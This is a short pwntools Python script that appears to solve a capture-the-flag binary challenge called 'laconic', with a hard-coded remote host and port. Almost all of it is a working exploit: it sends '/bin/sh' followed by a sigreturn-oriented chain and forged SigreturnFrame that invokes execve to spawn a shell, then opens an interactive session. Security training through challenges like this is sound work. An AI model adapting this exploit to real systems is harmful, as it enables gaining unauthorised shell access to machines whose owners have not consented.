#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './laconic'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.62.255', 46251

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x43015
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec laconic 
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX unknown - GNU_STACK missing
#     PIE:      No PIE (0x42000)
#     Stack:    Executable
#     RWX:      Has RWX segments


def exploit():
    global io
    io = initialize()

    pop_rax = 0x43018
    syscall = 0x43015
    ret = 0x43017

    frame = SigreturnFrame()
    frame.rax = 0x3b 
    frame.rdi = 0x43238 
    frame.rsi = 0 
    frame.rdx = 0
    frame.rip = syscall

    payload = b'/bin/sh\x00'
    payload += flat([
        pop_rax,
        15,
        syscall,
    ]) + bytes(frame)
    io.sendline(payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
